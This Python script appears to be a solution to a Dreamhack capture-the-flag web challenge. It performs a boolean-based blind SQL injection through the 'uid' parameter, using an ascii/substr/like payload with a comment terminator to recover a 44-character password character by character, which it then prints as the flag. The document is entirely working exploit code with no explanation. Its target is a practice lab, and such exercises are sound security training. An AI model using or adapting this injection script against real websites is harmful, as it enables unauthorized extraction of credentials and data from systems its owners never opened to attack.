import requests
from tqdm import tqdm

url="http://host3.dreamhack.games:13181/"

pwLen=44
pw=""

for i in range(1,pwLen+1):
    print(f"try{i}")
    for j in range(0,127):
        param={
            'uid':f"'||(ascii(substr(upw,{i},1)))like({j})#"
        }
        if 'admin' in requests.get(url,params=param).text:
            pw+=chr(j)
            print(f"pw={pw}")
            break


print(f"flag = {pw}")